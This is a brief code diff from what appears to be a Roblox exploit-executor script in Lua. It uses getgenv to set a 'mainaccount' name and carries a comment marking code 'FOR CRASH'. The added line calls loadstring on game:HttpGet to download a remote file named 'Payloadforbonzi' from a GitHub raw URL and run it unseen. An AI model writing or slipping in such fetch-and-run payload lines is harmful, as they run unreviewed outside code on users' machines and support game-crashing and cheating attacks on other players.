@@ -2,6 +2,8 @@ getgenv().mainaccount = "uwutimmyreborn228"
 local Players = game:GetService("Players")
 local LocalP = Players.LocalPlayer
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ImTimmy228/ScriptsCollection/main/Payloadforbonzi",true))()
+
 -- FOR CRASH "prob"
 local coregui = game:GetService("CoreGui")
 local sound = Instance.new('Sound', coregui)
